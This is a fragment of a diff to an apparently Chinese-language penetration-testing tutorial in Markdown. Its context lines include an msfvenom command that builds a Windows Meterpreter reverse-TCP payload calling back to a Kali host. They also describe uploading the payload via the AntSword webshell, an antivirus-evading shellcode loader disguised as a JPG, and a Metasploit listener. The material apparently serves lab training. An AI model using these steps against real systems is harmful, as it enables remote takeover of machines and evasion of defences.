@@ -43,7 +43,7 @@
 ```shell
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.228.129 LPORT=5555 -f exe -o 5555.exe
 ```   
-ip为kali的ip
+ip为kali的ip   
 ![Alt text](image-12.png)   
 ## 4. 使用蚁剑上传制作好的 `5555.exe`
 ![Alt text](image-13.png)    
@@ -322,6 +322,7 @@ mac 下运行会报错。
 ![Alt text](image-62.png)   
 查看`shellcode`加载器的免杀效果：
 72个杀毒引擎中，只有10个报毒。   
+![Alt text](image-68.png)   
 使用msf启动监听。   
 ![Alt text](image-63.png)   
 利用蚁剑，上传 `shellcode` 和生成的 `crowsec.jpg`。   
